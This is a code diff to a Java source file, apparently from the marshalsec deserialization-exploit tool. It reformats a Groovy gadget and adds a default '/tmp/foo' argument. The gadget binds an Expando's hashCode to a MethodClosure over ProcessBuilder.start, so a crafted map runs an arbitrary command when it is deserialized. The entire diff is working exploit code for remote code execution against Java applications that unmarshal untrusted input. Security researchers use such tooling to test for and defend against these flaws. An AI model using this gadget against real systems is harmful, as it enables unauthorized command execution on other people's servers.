@@ -32,32 +32,32 @@ import marshalsec.UtilFactory;
 
 /**
  * @author mbechler
- *
  */
 public interface Groovy extends Gadget {
 
-    @Primary
-    @Args ( minArgs = 1, args = {
-        "cmd", "args.."
-    }, defaultArgs = {
-        MarshallerBase.defaultExecutable
-    } )
-    default Object makeGroovyMap ( UtilFactory uf, String[] args ) throws Exception {
-        Object e = makeGroovy(args);
-        return uf.makeHashCodeTrigger(e);
-    }
+	// todo marko: add args to groovy payload
+	@Primary
+	@Args(minArgs = 1, args = {
+		"cmd", "args..."
+	}, defaultArgs = {
+		MarshallerBase.defaultExecutable, "/tmp/foo"
+	})
+	default Object makeGroovyMap(UtilFactory uf, String[] args) throws Exception {
+		Object e = makeGroovy(args);
+		return uf.makeHashCodeTrigger(e);
+	}
 
 
-    @Args ( minArgs = 1, args = {
-        "cmd", "args.."
-    }, defaultArgs = {
-        MarshallerBase.defaultExecutable
-    } )
-    default Object makeGroovy ( String[] args ) throws Exception {
-        Expando expando = new Expando();
-        ProcessBuilder pb = new ProcessBuilder(args);
-        MethodClosure mc = new MethodClosure(pb, "start");
-        expando.setProperty("hashCode", mc);
-        return expando;
-    }
+	@Args(minArgs = 1, args = {
+		"cmd", "args.."
+	}, defaultArgs = {
+		MarshallerBase.defaultExecutable, "/tmp/foo"
+	})
+	default Object makeGroovy(String[] args) throws Exception {
+		Expando expando = new Expando();
+		ProcessBuilder pb = new ProcessBuilder(args);
+		MethodClosure mc = new MethodClosure(pb, "start");
+		expando.setProperty("hashCode", mc);
+		return expando;
+	}
 }
